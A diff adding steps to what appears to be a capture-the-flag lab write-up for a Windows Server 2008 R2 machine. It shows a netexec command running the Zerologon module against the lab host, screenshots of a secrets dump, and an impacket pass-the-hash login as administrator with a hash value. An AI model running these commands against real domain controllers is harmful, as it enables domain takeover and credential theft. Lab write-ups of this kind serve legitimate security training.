@@ -29,3 +29,22 @@ PORT      STATE SERVICE
 ![](Public_Shares.png)
 
 
+
+This is Server 2008 R2 , So its vulnerable to known exploits!
+
+```
+└─# nxc smb 10.10.69.152 -u guest -p '' -M zerologon
+```
+
+![](Zero_Logon.png)
+
+![](Secrets_Dump.png)
+
+
+```
+└─# impacket-smbclient retro2.vl/administrator@10.10.69.152 -hashes :c06552bdb50ada21a7c74536
+```
+
+
+For Intended Way stay Tuned !
+
